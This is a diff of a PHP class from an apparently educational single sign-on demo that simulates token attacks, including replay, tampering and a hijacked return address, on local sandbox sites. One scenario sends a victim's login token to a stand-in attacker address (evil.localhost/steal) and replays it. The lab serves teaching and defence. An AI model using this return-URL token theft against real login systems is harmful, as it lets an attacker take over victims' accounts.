@@ -54,7 +54,7 @@ final class AttackLab
         ],
         'return-url' => [
             'title' => 'Hijacked return address',
-            'summary' => 'The victim, logged in on idp, follows a link of the attacker: idp/sso?app=mail&return=http://evil.localhost/steal. The token goes to the attacker, who presents it to mail.',
+            'summary' => 'The victim, logged in on idp, follows a link the attacker made: idp/sso?app=mail, with an address of the attacker, evil…/steal, as return address. The token goes to the attacker, who presents it to mail.',
             'protection' => 'returnUrl',
             'by' => 'idp',
             'lesson' => 'idp must only post a token to the address registered for the application; any other return address is a way to steal tokens. Every check of the library passes: the token is genuine, only its destination is wrong.',
@@ -88,18 +88,18 @@ final class AttackLab
     /** @var string */
     private $varDir;
 
-    /** @var int|null */
-    private $port;
+    /** @var Base Where the sites live. */
+    private $base;
 
     /**
      * @param string $varDir The directory under which each run gets a
      *     sandbox of its own (demo-sso/var/).
-     * @param int|null $port The port the sites are served on.
+     * @param Base $base Where the sites live.
      */
-    public function __construct($varDir, $port)
+    public function __construct($varDir, Base $base)
     {
         $this->varDir = $varDir;
-        $this->port = $port;
+        $this->base = $base;
     }
 
     /**
@@ -157,14 +157,14 @@ final class AttackLab
         $sandbox = $this->varDir . '/lab-' . bin2hex(random_bytes(8));
         try
         {
-            $demo = new Demo($sandbox, new Settings($values));
+            $demo = new Demo($sandbox, new Settings($values), $this->base->isOnline() ? $this->base->domain() : null);
             $method = 'attack' . str_replace(' ', '', ucwords(str_replace('-', ' ', $id)));
             $accepted = $this->$method($demo);
             $events = (new Trace($sandbox . '/trace.json'))->all();
         }
         finally
         {
-            self::remove($sandbox);
+            Visitors::remove($sandbox);
         }
 
         return [
@@ -185,8 +185,8 @@ final class AttackLab
         $response = $victim->request('GET', $this->url('mail', '/'));
         $response = $victim->request('GET', $response['headers']['Location']);
         $response = $victim->request('POST', $this->url(Sites::IDP, '/login'), [
-            'app' => 'mail', 'return' => Sites::acsUrl('mail', $this->port), 'username' => 'ragnar', 'password' => 'kattegat',
-        ], Sites::origin(Sites::IDP, $this->port));
+            'app' => 'mail', 'return' => Sites::acsUrl('mail', $this->base), 'username' => 'ragnar', 'password' => 'kattegat',
+        ], Sites::origin(Sites::IDP, $this->base));
 
         return Browser::postedToken($response);
     }
@@ -206,7 +206,7 @@ final class AttackLab
     {
         $posted = $this->victimToken(new Browser($demo));
 
-        return $this->present(new Browser($demo), Sites::acsUrl('crm', $this->port), $posted['token']);
+        return $this->present(new Browser($demo), Sites::acsUrl('crm', $this->base), $posted['token']);
     }
 
     private function attackReplay(Demo $demo)
@@ -241,7 +241,7 @@ final class AttackLab
         $this->present($victim, $posted['action'], $posted['token']);
 
         // The victim follows the link of the attacker.
-        $evil = 'http://evil.localhost' . (is_null($this->port) ? '' : ':' . $this->port) . self::EVIL_PATH;
+        $evil = $this->base->origin('evil') . self::EVIL_PATH;
         $response = $victim->request('GET', $this->url(Sites::IDP, '/sso?' . http_build_query(['app' => 'mail', 'return' => $evil])));
         $stolen = Browser::postedToken($response);
         if (is_null($stolen))
@@ -253,7 +253,7 @@ final class AttackLab
             'title' => 'The browser of the victim posts the token to ' . $stolen['action'] . ': the attacker has it.',
         ]);
 
-        return $this->present(new Browser($demo), Sites::acsUrl('mail', $this->port), $stolen['token']);
+        return $this->present(new Browser($demo), Sites::acsUrl('mail', $this->base), $stolen['token']);
     }
 
     private function attackTamper(Demo $demo)
@@ -280,7 +280,7 @@ final class AttackLab
     {
         $posted = $this->victimToken(new Browser($demo));
 
-        return $this->present(new Browser($demo), Sites::acsUrl('crm', $this->port), $posted['token']);
+        return $this->present(new Browser($demo), Sites::acsUrl('crm', $this->base), $posted['token']);
     }
 
     /**
@@ -317,7 +317,7 @@ final class AttackLab
 
     private function url($site, $path)
     {
-        return Sites::origin($site, $this->port) . $path;
+        return Sites::origin($site, $this->base) . $path;
     }
 
     /**
@@ -326,20 +326,5 @@ final class AttackLab
     private function sandboxOf(Demo $demo)
     {
         return $demo->varDir();
-    }
-
-    /**
-     * Removes a directory and its content.
-     */
-    private static function remove($dir)
-    {
-        foreach (glob($dir . '/*') ?: [] as $file)
-        {
-            is_dir($file) ? self::remove($file) : unlink($file);
-        }
-        if (is_dir($dir))
-        {
-            rmdir($dir);
-        }
     }
 }
